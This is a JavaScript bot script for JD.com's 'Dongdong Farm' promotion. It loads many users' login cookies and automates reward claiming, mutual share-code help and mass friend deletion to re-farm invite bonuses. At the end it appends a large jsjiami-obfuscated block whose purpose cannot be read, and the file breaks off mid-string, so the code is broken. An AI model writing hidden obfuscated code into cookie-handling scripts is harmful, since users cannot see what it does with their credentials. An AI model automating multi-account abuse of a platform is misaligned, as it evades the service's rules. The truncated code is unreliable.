    if (!$.getdata(helpSuccessPeoplesKey)) {
      //把前一天的清除
      $.setdata('', timeFormat(Date.now() - 24 * 60 * 60 * 1000) + $.farmInfo.farmUserPro.shareCode);
      $.setdata('', helpSuccessPeoplesKey);
    }
    if (helpSuccessPeoples) {
      if ($.getdata(helpSuccessPeoplesKey)) {
        $.setdata($.getdata(helpSuccessPeoplesKey) + ',' + helpSuccessPeoples, helpSuccessPeoplesKey);
      } else {
        $.setdata(helpSuccessPeoples, helpSuccessPeoplesKey);
      }
    }
    helpSuccessPeoples = $.getdata(helpSuccessPeoplesKey);
  }
  if (helpSuccessPeoples && helpSuccessPeoples.length > 0) {
    message += `【您助力的好友👬】${helpSuccessPeoples.substr(0, helpSuccessPeoples.length - 1)}\n`;
  }
  if (salveHelpAddWater > 0) {
    // message += `【助力好友👬】获得${salveHelpAddWater}g💧\n`;
    console.log(`【助力好友👬】获得${salveHelpAddWater}g💧\n`);
  }
  message += `【今日剩余助力👬】${remainTimes}次\n`;
  console.log('助力好友结束，即将开始领取额外水滴奖励\n');
}
//水滴雨
async function executeWaterRains() {
  let executeWaterRain = !$.farmTask.waterRainInit.f;
  if (executeWaterRain) {
    console.log(`水滴雨任务，每天两次，最多可得10g水滴`);
    console.log(`两次水滴雨任务是否全部完成：${$.farmTask.waterRainInit.f ? '是' : '否'}`);
    if ($.farmTask.waterRainInit.lastTime) {
      if (Date.now() < ($.farmTask.waterRainInit.lastTime + 3 * 60 * 60 * 1000)) {
        executeWaterRain = false;
        // message += `【第${$.farmTask.waterRainInit.winTimes + 1}次水滴雨】未到时间，请${new Date($.farmTask.waterRainInit.lastTime + 3 * 60 * 60 * 1000).toLocaleTimeString()}再试\n`;
        console.log(`\`【第${$.farmTask.waterRainInit.winTimes + 1}次水滴雨】未到时间，请${new Date($.farmTask.waterRainInit.lastTime + 3 * 60 * 60 * 1000).toLocaleTimeString()}再试\n`);
      }
    }
    if (executeWaterRain) {
      console.log(`开始水滴雨任务,这是第${$.farmTask.waterRainInit.winTimes + 1}次，剩余${2 - ($.farmTask.waterRainInit.winTimes + 1)}次`);
      await waterRainForFarm();
      console.log('水滴雨waterRain');
      if ($.waterRain.code === '0') {
        console.log('水滴雨任务执行成功，获得水滴：' + $.waterRain.addEnergy + 'g');
        console.log(`【第${$.farmTask.waterRainInit.winTimes + 1}次水滴雨】获得${$.waterRain.addEnergy}g水滴\n`);
        // message += `【第${$.farmTask.waterRainInit.winTimes + 1}次水滴雨】获得${$.waterRain.addEnergy}g水滴\n`;
      }
    }
  } else {
    // message += `【水滴雨】已全部完成，获得20g💧\n`;
  }
}
//打卡领水活动
async function clockInIn() {
  console.log('开始打卡领水活动（签到，关注，领券）');
  await clockInInitForFarm();
  if ($.clockInInit.code === '0') {
    // 签到得水滴
    if (!$.clockInInit.todaySigned) {
      console.log('开始今日签到');
      await clockInForFarm();
      console.log(`打卡结果${JSON.stringify($.clockInForFarmRes)}`);
      if ($.clockInForFarmRes.code === '0') {
        // message += `【第${$.clockInForFarmRes.signDay}天签到】获得${$.clockInForFarmRes.amount}g💧\n`;
        console.log(`【第${$.clockInForFarmRes.signDay}天签到】获得${$.clockInForFarmRes.amount}g💧\n`)
        if ($.clockInForFarmRes.signDay === 7) {
          //可以领取惊喜礼包
          console.log('开始领取--惊喜礼包38g水滴');
          await gotClockInGift();
          if ($.gotClockInGiftRes.code === '0') {
            // message += `【惊喜礼包】获得${$.gotClockInGiftRes.amount}g💧\n`;
            console.log(`【惊喜礼包】获得${$.gotClockInGiftRes.amount}g💧\n`);
          }
        }
      }
    }
    if ($.clockInInit.todaySigned && $.clockInInit.totalSigned === 7) {
      console.log('开始领取--惊喜礼包38g水滴');
      await gotClockInGift();
      if ($.gotClockInGiftRes.code === '0') {
        // message += `【惊喜礼包】获得${$.gotClockInGiftRes.amount}g💧\n`;
        console.log(`【惊喜礼包】获得${$.gotClockInGiftRes.amount}g💧\n`);
      }
    }
    // 限时关注得水滴
    if ($.clockInInit.themes && $.clockInInit.themes.length > 0) {
      for (let item of $.clockInInit.themes) {
        if (!item.hadGot) {
          console.log(`关注ID${item.id}`);
          await clockInFollowForFarm(item.id, "theme", "1");
          console.log(`themeStep1--结果${JSON.stringify($.themeStep1)}`);
          if ($.themeStep1.code === '0') {
            await clockInFollowForFarm(item.id, "theme", "2");
            console.log(`themeStep2--结果${JSON.stringify($.themeStep2)}`);
            if ($.themeStep2.code === '0') {
              console.log(`关注${item.name}，获得水滴${$.themeStep2.amount}g`);
            }
          }
        }
      }
    }
    // 限时领券得水滴
    if ($.clockInInit.venderCoupons && $.clockInInit.venderCoupons.length > 0) {
      for (let item of $.clockInInit.venderCoupons) {
        if (!item.hadGot) {
          console.log(`领券的ID${item.id}`);
          await clockInFollowForFarm(item.id, "venderCoupon", "1");
          console.log(`venderCouponStep1--结果${JSON.stringify($.venderCouponStep1)}`);
          if ($.venderCouponStep1.code === '0') {
            await clockInFollowForFarm(item.id, "venderCoupon", "2");
            if ($.venderCouponStep2.code === '0') {
              console.log(`venderCouponStep2--结果${JSON.stringify($.venderCouponStep2)}`);
              console.log(`从${item.name}领券，获得水滴${$.venderCouponStep2.amount}g`);
            }
          }
        }
      }
    }
  }
  console.log('开始打卡领水活动（签到，关注，领券）结束\n');
}
//
async function getAwardInviteFriend() {
  await friendListInitForFarm();//查询好友列表
  //console.log(`查询好友列表数据：${JSON.stringify($.friendList)}\n`)
  if ($.friendList) {
    console.log(`\n今日已邀请好友${$.friendList.inviteFriendCount}个 / 每日邀请上限${$.friendList.inviteFriendMax}个`);
    console.log(`开始删除${$.friendList.friends && $.friendList.friends.length}个好友,可拿每天的邀请奖励`);
    if ($.friendList.friends && $.friendList.friends.length > 0) {
      for (let friend of $.friendList.friends) {
        console.log(`\n开始删除好友 [${friend.shareCode}]`);
        const deleteFriendForFarm = await request('deleteFriendForFarm', { "shareCode": `${friend.shareCode}`,"version":8,"channel":1 });
        if (deleteFriendForFarm && deleteFriendForFarm.code === '0') {
          console.log(`删除好友 [${friend.shareCode}] 成功\n`);
        }
      }
    }
    await receiveFriendInvite();//为他人助力,接受邀请成为别人的好友
    if ($.friendList.inviteFriendCount > 0) {
      if ($.friendList.inviteFriendCount > $.friendList.inviteFriendGotAwardCount) {
        console.log('开始领取邀请好友的奖励');
        await awardInviteFriendForFarm();
        console.log(`领取邀请好友的奖励结果：：${JSON.stringify($.awardInviteFriendRes)}`);
      }
    } else {
      console.log('今日未邀请过好友')
    }
  } else {
    console.log(`查询好友列表失败\n`);
  }
}
//给好友浇水
async function doFriendsWater() {
  await friendListInitForFarm();
  console.log('开始给好友浇水...');
  await taskInitForFarm();
  const { waterFriendCountKey, waterFriendMax } = $.farmTask.waterFriendTaskInit;
  console.log(`今日已给${waterFriendCountKey}个好友浇水`);
  if (waterFriendCountKey < waterFriendMax) {
    let needWaterFriends = [];
    if ($.friendList.friends && $.friendList.friends.length > 0) {
      $.friendList.friends.map((item, index) => {
        if (item.friendState === 1) {
          if (needWaterFriends.length < (waterFriendMax - waterFriendCountKey)) {
            needWaterFriends.push(item.shareCode);
          }
        }
      });
      //TODO ,发现bug,github action运行发现有些账号第一次没有给3个好友浇水
      console.log(`需要浇水的好友列表shareCodes:${JSON.stringify(needWaterFriends)}`);
      let waterFriendsCount = 0, cardInfoStr = '';
      for (let index = 0; index < needWaterFriends.length; index ++) {
        await waterFriendForFarm(needWaterFriends[index]);
        console.log(`为第${index+1}个好友浇水结果:${JSON.stringify($.waterFriendForFarmRes)}\n`)
        if ($.waterFriendForFarmRes.code === '0') {
          waterFriendsCount ++;
          if ($.waterFriendForFarmRes.cardInfo) {
            console.log('为好友浇水获得道具了');
            if ($.waterFriendForFarmRes.cardInfo.type === 'beanCard') {
              console.log(`获取道具卡:${$.waterFriendForFarmRes.cardInfo.rule}`);
              cardInfoStr += `水滴换豆卡,`;
            } else if ($.waterFriendForFarmRes.cardInfo.type === 'fastCard') {
              console.log(`获取道具卡:${$.waterFriendForFarmRes.cardInfo.rule}`);
              cardInfoStr += `快速浇水卡,`;
            } else if ($.waterFriendForFarmRes.cardInfo.type === 'doubleCard') {
              console.log(`获取道具卡:${$.waterFriendForFarmRes.cardInfo.rule}`);
              cardInfoStr += `水滴翻倍卡,`;
            } else if ($.waterFriendForFarmRes.cardInfo.type === 'signCard') {
              console.log(`获取道具卡:${$.waterFriendForFarmRes.cardInfo.rule}`);
              cardInfoStr += `加签卡,`;
            }
          }
        } else if ($.waterFriendForFarmRes.code === '11') {
          console.log('水滴不够,跳出浇水')
        }
      }
      // message += `【好友浇水】已给${waterFriendsCount}个好友浇水,消耗${waterFriendsCount * 10}g水\n`;
      console.log(`【好友浇水】已给${waterFriendsCount}个好友浇水,消耗${waterFriendsCount * 10}g水\n`);
      if (cardInfoStr && cardInfoStr.length > 0) {
        // message += `【好友浇水奖励】${cardInfoStr.substr(0, cardInfoStr.length - 1)}\n`;
        console.log(`【好友浇水奖励】${cardInfoStr.substr(0, cardInfoStr.length - 1)}\n`);
      }
    } else {
      console.log('您的好友列表暂无好友,快去邀请您的好友吧!')
    }
  } else {
    console.log(`今日已为好友浇水量已达${waterFriendMax}个`)
  }
}
//领取给3个好友浇水后的奖励水滴
async function getWaterFriendGotAward() {
  await taskInitForFarm();
  const { waterFriendCountKey, waterFriendMax, waterFriendSendWater, waterFriendGotAward } = $.farmTask.waterFriendTaskInit
  if (waterFriendCountKey >= waterFriendMax) {
    if (!waterFriendGotAward) {
      await waterFriendGotAwardForFarm();
      console.log(`领取给${waterFriendMax}个好友浇水后的奖励水滴::${JSON.stringify($.waterFriendGotAwardRes)}`)
      if ($.waterFriendGotAwardRes.code === '0') {
        // message += `【给${waterFriendMax}好友浇水】奖励${$.waterFriendGotAwardRes.addWater}g水滴\n`;
        console.log(`【给${waterFriendMax}好友浇水】奖励${$.waterFriendGotAwardRes.addWater}g水滴\n`);
      }
    } else {
      console.log(`给好友浇水的${waterFriendSendWater}g水滴奖励已领取\n`);
      // message += `【给${waterFriendMax}好友浇水】奖励${waterFriendSendWater}g水滴已领取\n`;
    }
  } else {
    console.log(`暂未给${waterFriendMax}个好友浇水\n`);
  }
}
//接收成为对方好友的邀请
async function receiveFriendInvite() {
  for (let code of newShareCodes) {
    if (code === $.farmInfo.farmUserPro.shareCode) {
      console.log('自己不能邀请自己成为好友噢\n')
      continue
    }
    await inviteFriend(code);
    // console.log(`接收邀请成为好友结果:${JSON.stringify($.inviteFriendRes.helpResult)}`)
    if ($.inviteFriendRes.helpResult.code === '0') {
      console.log(`接收邀请成为好友结果成功,您已成为${$.inviteFriendRes.helpResult.masterUserInfo.nickName}的好友`)
    } else if ($.inviteFriendRes.helpResult.code === '17') {
      console.log(`接收邀请成为好友结果失败,对方已是您的好友`)
    }
  }
  // console.log(`开始接受6fbd26cc27ac44d6a7fed34092453f77的邀请\n`)
  // await inviteFriend('6fbd26cc27ac44d6a7fed34092453f77');
  // console.log(`接收邀请成为好友结果:${JSON.stringify($.inviteFriendRes.helpResult)}`)
  // if ($.inviteFriendRes.helpResult.code === '0') {
  //   console.log(`您已成为${$.inviteFriendRes.helpResult.masterUserInfo.nickName}的好友`)
  // } else if ($.inviteFriendRes.helpResult.code === '17') {
  //   console.log(`对方已是您的好友`)
  // }
}
async function duck() {
  for (let i = 0; i < 10; i++) {
    //这里循环十次
    await getFullCollectionReward();
    if ($.duckRes.code === '0') {
      if (!$.duckRes.hasLimit) {
        console.log(`小鸭子游戏:${$.duckRes.title}`);
        // if ($.duckRes.type !== 3) {
        //   console.log(`${$.duckRes.title}`);
        //   if ($.duckRes.type === 1) {
        //     message += `【小鸭子】为你带回了水滴\n`;
        //   } else if ($.duckRes.type === 2) {
        //     message += `【小鸭子】为你带回快速浇水卡\n`
        //   }
        // }
      } else {
        console.log(`${$.duckRes.title}`)
        break;
      }
    } else if ($.duckRes.code === '10') {
      console.log(`小鸭子游戏达到上限`)
      break;
    }
  }
}
// ========================API调用接口========================
//鸭子，点我有惊喜
async function getFullCollectionReward() {
  return new Promise(resolve => {
    const body = {"type": 2, "version": 6, "channel": 2};
    $.post(taskUrl("getFullCollectionReward", body), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东农场: API查询请求失败 ‼️‼️');
          console.log(JSON.stringify(err));
          $.logErr(err);
        } else {
          if (safeGet(data)) {
            $.duckRes = JSON.parse(data);
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

/**
 * 领取10次浇水奖励API
 */
async function totalWaterTaskForFarm() {
  const functionId = arguments.callee.name.toString();
  $.totalWaterReward = await request(functionId);
}
//领取首次浇水奖励API
async function firstWaterTaskForFarm() {
  const functionId = arguments.callee.name.toString();
  $.firstWaterReward = await request(functionId);
}
//领取给3个好友浇水后的奖励水滴API
async function waterFriendGotAwardForFarm() {
  const functionId = arguments.callee.name.toString();
  $.waterFriendGotAwardRes = await request(functionId, {"version": 4, "channel": 1});
}
// 查询背包道具卡API
async function myCardInfoForFarm() {
  const functionId = arguments.callee.name.toString();
  $.myCardInfoRes = await request(functionId, {"version": 5, "channel": 1});
}
//使用道具卡API
async function userMyCardForFarm(cardType) {
  const functionId = arguments.callee.name.toString();
  $.userMyCardRes = await request(functionId, {"cardType": cardType});
}
/**
 * 领取浇水过程中的阶段性奖励
 * @param type
 * @returns {Promise<void>}
 */
async function gotStageAwardForFarm(type) {
  $.gotStageAwardForFarmRes = await request(arguments.callee.name.toString(), {'type': type});
}
//浇水API
async function waterGoodForFarm() {
  await $.wait(1000);
  console.log('等待了1秒');

  const functionId = arguments.callee.name.toString();
  $.waterResult = await request(functionId);
}
// 初始化集卡抽奖活动数据API
async function initForTurntableFarm() {
  $.initForTurntableFarmRes = await request(arguments.callee.name.toString(), {version: 4, channel: 1});
}
async function lotteryForTurntableFarm() {
  await $.wait(2000);
  console.log('等待了2秒');
  $.lotteryRes = await request(arguments.callee.name.toString(), {type: 1, version: 4, channel: 1});
}

async function timingAwardForTurntableFarm() {
  $.timingAwardRes = await request(arguments.callee.name.toString(), {version: 4, channel: 1});
}

async function browserForTurntableFarm(type, adId) {
  if (type === 1) {
    console.log('浏览爆品会场');
  }
  if (type === 2) {
    console.log('天天抽奖浏览任务领取水滴');
  }
  const body = {"type": type,"adId": adId,"version":4,"channel":1};
  $.browserForTurntableFarmRes = await request(arguments.callee.name.toString(), body);
  // 浏览爆品会场8秒
}
//天天抽奖浏览任务领取水滴API
async function browserForTurntableFarm2(type) {
  const body = {"type":2,"adId": type,"version":4,"channel":1};
  $.browserForTurntableFarm2Res = await request('browserForTurntableFarm', body);
}
/**
 * 天天抽奖拿好礼-助力API(每人每天三次助力机会)
 */
async function lotteryMasterHelp() {
  $.lotteryMasterHelpRes = await request(`initForFarm`, {
    imageUrl: "",
    nickName: "",
    shareCode: arguments[0] + '-3',
    babelChannel: "3",
    version: 4,
    channel: 1
  });
}

//领取5人助力后的额外奖励API
async function masterGotFinishedTaskForFarm() {
  const functionId = arguments.callee.name.toString();
  $.masterGotFinished = await request(functionId);
}
//助力好友信息API
async function masterHelpTaskInitForFarm() {
  const functionId = arguments.callee.name.toString();
  $.masterHelpResult = await request(functionId);
}
//接受对方邀请,成为对方好友的API
async function inviteFriend() {
  $.inviteFriendRes = await request(`initForFarm`, {
    imageUrl: "",
    nickName: "",
    shareCode: arguments[0] + '-inviteFriend',
    version: 4,
    channel: 2
  });
}
// 助力好友API
async function masterHelp() {
  $.helpResult = await request(`initForFarm`, {
    imageUrl: "",
    nickName: "",
    shareCode: arguments[0],
    babelChannel: "3",
    version: 2,
    channel: 1
  });
}
/**
 * 水滴雨API
 */
async function waterRainForFarm() {
  const functionId = arguments.callee.name.toString();
  const body = {"type": 1, "hongBaoTimes": 100, "version": 3};
  $.waterRain = await request(functionId, body);
}
/**
 * 打卡领水API
 */
async function clockInInitForFarm() {
  const functionId = arguments.callee.name.toString();
  $.clockInInit = await request(functionId);
}

// 连续签到API
async function clockInForFarm() {
  const functionId = arguments.callee.name.toString();
  $.clockInForFarmRes = await request(functionId, {"type": 1});
}

//关注，领券等API
async function clockInFollowForFarm(id, type, step) {
  const functionId = arguments.callee.name.toString();
  let body = {
    id,
    type,
    step
  }
  if (type === 'theme') {
    if (step === '1') {
      $.themeStep1 = await request(functionId, body);
    } else if (step === '2') {
      $.themeStep2 = await request(functionId, body);
    }
  } else if (type === 'venderCoupon') {
    if (step === '1') {
      $.venderCouponStep1 = await request(functionId, body);
    } else if (step === '2') {
      $.venderCouponStep2 = await request(functionId, body);
    }
  }
}

// 领取连续签到7天的惊喜礼包API
async function gotClockInGift() {
  $.gotClockInGiftRes = await request('clockInForFarm', {"type": 2})
}

//定时领水API
async function gotThreeMealForFarm() {
  const functionId = arguments.callee.name.toString();
  $.threeMeal = await request(functionId);
}
/**
 * 浏览广告任务API
 * type为0时, 完成浏览任务
 * type为1时, 领取浏览任务奖励
 */
async function browseAdTaskForFarm(advertId, type) {
  const functionId = arguments.callee.name.toString();
  if (type === 0) {
    $.browseResult = await request(functionId, {advertId, type});
  } else if (type === 1) {
    $.browseRwardResult = await request(functionId, {advertId, type});
  }
}
// 被水滴砸中API
async function gotWaterGoalTaskForFarm() {
  $.goalResult = await request(arguments.callee.name.toString(), {type: 3});
}
//签到API
async function signForFarm() {
  const functionId = arguments.callee.name.toString();
  $.signResult = await request(functionId);
}
/**
 * 初始化农场, 可获取果树及用户信息API
 */
async function initForFarm() {
  return new Promise(resolve => {
    const option =  {
      url: `${JD_API_HOST}?functionId=initForFarm`,
      body: `body=${escape(JSON.stringify({"version":4}))}&appid=wh5&clientVersion=9.1.0`,
      headers: {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "zh-CN,zh;q=0.9",
        "cache-control": "no-cache",
        "cookie": cookie,
        "origin": "https://home.m.jd.com",
        "pragma": "no-cache",
        "referer": "https://home.m.jd.com/myJd/newhome.action",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0"),
        "Content-Type": "application/x-www-form-urlencoded"
      },
      timeout: 10000,
    };
    $.post(option, (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东农场: API查询请求失败 ‼️‼️');
          console.log(JSON.stringify(err));
          $.logErr(err);
        } else {
          if (safeGet(data)) {
            $.farmInfo = JSON.parse(data)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

// 初始化任务列表API
async function taskInitForFarm() {
  console.log('\n初始化任务列表')
  const functionId = arguments.callee.name.toString();
  $.farmTask = await request(functionId);
}
//获取好友列表API
async function friendListInitForFarm() {
  $.friendList = await request('friendListInitForFarm', {"version": 4, "channel": 1});
  // console.log('aa', aa);
}
// 领取邀请好友的奖励API
async function awardInviteFriendForFarm() {
  $.awardInviteFriendRes = await request('awardInviteFriendForFarm');
}
//为好友浇水API
async function waterFriendForFarm(shareCode) {
  const body = {"shareCode": shareCode, "version": 6, "channel": 1}
  $.waterFriendForFarmRes = await request('waterFriendForFarm', body);
}
async function showMsg() {
  if ($.isNode() && process.env.FRUIT_NOTIFY_CONTROL) {
    $.ctrTemp = `${process.env.FRUIT_NOTIFY_CONTROL}` === 'false';
  } else if ($.getdata('jdFruitNotify')) {
    $.ctrTemp = $.getdata('jdFruitNotify') === 'false';
  } else {
    $.ctrTemp = `${jdNotify}` === 'false';
  }
  if ($.ctrTemp) {
    $.msg($.name, subTitle, message, option);
    if ($.isNode()) {
      allMessage += `${subTitle}\n${message}${$.index !== cookiesArr.length ? '\n\n' : ''}`;
      // await notify.sendNotify(`${$.name} - 账号${$.index} - ${$.nickName}`, `${subTitle}\n${message}`);
    }
  } else {
    $.log(`\n${message}\n`);
  }
}

function timeFormat(time) {
  let date;
  if (time) {
    date = new Date(time)
  } else {
    date = new Date();
  }
  return date.getFullYear() + '-' + ((date.getMonth() + 1) >= 10 ? (date.getMonth() + 1) : '0' + (date.getMonth() + 1)) + '-' + (date.getDate() >= 10 ? date.getDate() : '0' + date.getDate());
}
function readShareCode() {
  console.log(`开始`)
  return new Promise(async resolve => {
    $.get({url: "https://gitee.com/Soundantony/RandomShareCode/raw/master/JD_Fruit.json",headers:{
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 Edg/87.0.4280.88"
      }}, async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，将切换为备用API`)
          console.log(`随机取助力码放到您固定的互助码后面(不影响已有固定互助)`)
          $.get({url: `https://raw.githubusercontent.com/shuyeshuye/RandomShareCode/main/JD_Fruit.json`, 'timeout': 10000},(err, resp, data)=>{
          data = JSON.parse(data);})
        } else {
          if (data) {
            console.log(`随机取助力码放到您固定的互助码后面(不影响已有固定互助)`)
            data = JSON.parse(data);
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
    await $.wait(10000);
    resolve()
  })
}
function shareCodesFormat() {
  return new Promise(async resolve => {
    // console.log(`第${$.index}个京东账号的助力码:::${jdFruitShareArr[$.index - 1]}`)
    newShareCodes = [];
    if (jdFruitShareArr[$.index - 1]) {
      newShareCodes = jdFruitShareArr[$.index - 1].split('@');
    } else {
      console.log(`由于您第${$.index}个京东账号未提供shareCode,将采纳本脚本自带的助力码\n`)
      const tempIndex = $.index > shareCodes.length ? (shareCodes.length - 1) : ($.index - 1);
      newShareCodes = shareCodes[tempIndex].split('@');
    }
    const readShareCodeRes = await readShareCode();
    if (readShareCodeRes && readShareCodeRes.code === 200) {
      // newShareCodes = newShareCodes.concat(readShareCodeRes.data || []);
      newShareCodes = [...new Set([...newShareCodes, ...(readShareCodeRes.data || [])])];
    }
    console.log(`第${$.index}个京东账号将要助力的好友${JSON.stringify(newShareCodes)}`)
    resolve();
  })
}
function requireConfig() {
  return new Promise(resolve => {
    console.log('开始获取配置文件\n')
    notify = $.isNode() ? require('./sendNotify') : '';
    //Node.js用户请在jdCookie.js处填写京东ck;
    const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
    const jdFruitShareCodes = $.isNode() ? require('./jdFruitShareCodes.js') : '';
    //IOS等用户直接用NobyDa的jd cookie
    if ($.isNode()) {
      Object.keys(jdCookieNode).forEach((item) => {
        if (jdCookieNode[item]) {
          cookiesArr.push(jdCookieNode[item])
        }
      })
      if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
    } else {
      let cookiesData = $.getdata('CookiesJD') || "[]";
      cookiesData = jsonParse(cookiesData);
      cookiesArr = cookiesData.map(item => item.cookie);
      cookiesArr.reverse();
      cookiesArr.push(...[$.getdata('CookieJD2'), $.getdata('CookieJD')]);
      cookiesArr.reverse();
      cookiesArr = cookiesArr.filter(item => item !== "" && item !== null && item !== undefined);
    }
    console.log(`共${cookiesArr.length}个京东账号\n`)
    if ($.isNode()) {
      Object.keys(jdFruitShareCodes).forEach((item) => {
        if (jdFruitShareCodes[item]) {
          jdFruitShareArr.push(jdFruitShareCodes[item])
        }
      })
    } else {
      const boxShareCodeArr = ['jd_fruit1', 'jd_fruit2', 'jd_fruit3', 'jd_fruit4'];
      const boxShareCodeArr2 = ['jd2_fruit1', 'jd2_fruit2', 'jd2_fruit3', 'jd2_fruit4'];
      const isBox1 = boxShareCodeArr.some((item) => {
        const boxShareCode = $.getdata(item);
        return (boxShareCode !== undefined && boxShareCode !== null && boxShareCode !== '');
      });
      const isBox2 = boxShareCodeArr2.some((item) => {
        const boxShareCode = $.getdata(item);
        return (boxShareCode !== undefined && boxShareCode !== null && boxShareCode !== '');
      });
      isBox = isBox1 ? isBox1 : isBox2;
      if (isBox1) {
        let temp = [];
        for (const item of boxShareCodeArr) {
          if ($.getdata(item)) {
            temp.push($.getdata(item))
          }
        }
        jdFruitShareArr.push(temp.join('@'));
      }
      if (isBox2) {
        let temp = [];
        for (const item of boxShareCodeArr2) {
          if ($.getdata(item)) {
            temp.push($.getdata(item))
          }
        }
        jdFruitShareArr.push(temp.join('@'));
      }
    }
    // console.log(`jdFruitShareArr::${JSON.stringify(jdFruitShareArr)}`)
    // console.log(`jdFruitShareArr账号长度::${jdFruitShareArr.length}`)
    console.log(`您提供了${jdFruitShareArr.length}个账号的农场助力码\n`);
    resolve()
  })
}
function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0")
      },
      "timeout": 10000,
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
            if (data['retcode'] === 0) {
              $.nickName = data['base'].nickname;
            } else {
              $.nickName = $.UserName
            }
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function request(function_id, body = {}, timeout = 1000){
  return new Promise(resolve => {
    setTimeout(() => {
      $.get(taskUrl(function_id, body), (err, resp, data) => {
        try {
          if (err) {
            console.log('\n东东农场: API查询请求失败 ‼️‼️')
            console.log(JSON.stringify(err));
            console.log(`function_id:${function_id}`)
            $.logErr(err);
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
            }
          }
        } catch (e) {
          $.logErr(e, resp);
        } finally {
          resolve(data);
        }
      })
    }, timeout)
  })
}
function safeGet(data) {
  try {
    if (typeof JSON.parse(data) == "object") {
      return true;
    }
  } catch (e) {
    console.log(e);
    console.log(`京东服务器访问数据为空，请检查自身设备网络情况`);
    return false;
  }
}
function taskUrl(function_id, body = {}) {
  return {
    url: `${JD_API_HOST}?functionId=${function_id}&appid=wh5&body=${escape(JSON.stringify(body))}`,
    headers: {
      Cookie: cookie,
      UserAgent: $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0"),
    },
    timeout: 10000,
  }
}
function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
      return [];
    }
  }
}
var _0xodx='jsjiami.com.v6',_0xabe7=[_0xodx,'w6HCqSnDi8OT','fcK9w5NawrM=','b8K4wqTDgGM=','w5nCgAvDgsOPaA==','AcOyZA==','d8K7wqjDm1rCgl9sWMKhcBzCjQ==','csOsw5U=','w5h1LWonIT0dw4VZwpopw5Q=','w6VSwrrCqMKp','JghUEcOU','wo52wrHDrMOcw6QAwoXCqAk=','wqHDiMKsaRXChgg=','fVZ8bD8=','w4wzbkbDqMOxYQ==','TADDgjxY','aMOsw7DDnXg=','VEdgdihbw6HCmMKjLsO0ccKCwrNCfsOTYjoawrrCtSJkScKmw7TDgsKfS1M5wqDDj2fDrcOBHcK3w7HCjMOZY1hPHRfCkcO4JmkswqAiUcOaw4nCrGoAQMO7UCUGR8OrwqzDpsKZAsKjQih6KQ3DqW1sQ2NGw4jCvMOqwpwVbRtEVMKmYFbCmWPCnV/Ckg==','w5nDmVvCnmHCuEZHw48hZMOFworDoA==','McOuw43DicKmRiIZEMKrwqfCgSDDsDbCjcO3wqnDsRrCi0dTOMOSw4XDt8O6wqhsSh7Dgn8TwqHDjhPDtxYMw7nCoEw+w6suwr7DpmDDmsKwKndVw6JCXjhVwrrCrQBTwrhjwpt5EEY4SMOwEXDDmSx7wrvCqRTCtFo/YMKIGyNwwqJAwpFM','KsOCEMKPw78=','I34nwqrDusKYUHcMWMODRR/CqmVKwpDCtxoSSMKnw5PDmmxvCkPCpsO0w4rDhmRCNsOHwoJ+w73Ctgt5w4hj','wqTCgsOKIBDDoMO4MmzDgyRmLDfCiG/Du8KpcsOgRxbDhcKWwqI0w44Twq4wBMO4NMKpwovDpjnCrHFTwqsae8KDwrjCmBIZU1zCnMOqIcK5UMOjScO4w6k3ccKsZnbCmsObw49QwqTDpXfDsMKvw6wqw63CnifCucKebsK3B2PDgko=','b8OBHCd8','wprCu8KoIcK6','wphGwrHDpMOJ','FX0PHA==','bWVlZBM=','w6QFdFPDpg==','dwsyCkM=','CMOzdQ==','XDADw6k=','G8OSNH7orJbmsI3lpIzotJnvvILorIfmoa7mnbDnva3otIPphororLQ=','YQrDjQ==','U8KewprDqw==','MsKfw5B